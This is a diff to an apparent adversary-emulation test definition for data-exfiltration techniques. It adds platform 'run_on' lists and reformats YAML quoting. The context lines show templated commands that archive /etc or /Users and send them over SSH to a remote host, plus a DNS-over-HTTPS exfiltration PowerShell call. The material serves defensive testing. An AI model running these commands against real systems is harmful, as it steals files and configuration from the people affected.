@@ -21,6 +21,10 @@ atomic_tests:
     command: |
       ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
     name: sh
+  run_on:
+  - freebsd
+  - macos
+  - linux
 - name: Exfiltration Over Alternative Protocol - SSH
   auto_generated_guid: 7c3cb337-35ae-4d06-bf03-3032ed2ec268
   description: |
@@ -49,6 +53,10 @@ atomic_tests:
     command: |
       tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'
     name: sh
+  run_on:
+  - freebsd
+  - macos
+  - linux
 - name: DNSExfiltration (doh)
   auto_generated_guid: c943d285-ada3-45ca-b3aa-7cd6500c6a48
   description: |
@@ -69,7 +77,7 @@ atomic_tests:
     ps_module:
       description: DNSExfiltrator powershell ps_module
       type: path
-      default: 'PathToAtomicsFolder\..\ExternalPayloads\dnsexfil.ps1'
+      default: PathToAtomicsFolder\..\ExternalPayloads\dnsexfil.ps1
     doh:
       description: Google or CloudFlare DoH (DNS over HTTP) server
       type: string
@@ -77,9 +85,10 @@ atomic_tests:
     time:
       description: The time in milliseconds to wait between each DNS request
       type: string
-      default: "500"
+      default: '500'
     encoding:
-      description: Set to '-b32' to use base32 encoding of data. Might be required by some DNS resolvers.
+      description: Set to '-b32' to use base32 encoding of data. Might be required
+        by some DNS resolvers.
       type: string
       default:
   dependency_executor_name: powershell
@@ -96,3 +105,5 @@ atomic_tests:
       Import-Module "#{ps_module}"
       Invoke-DNSExfiltrator -i "#{ps_module}" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}
     name: powershell
+  run_on:
+  - windows
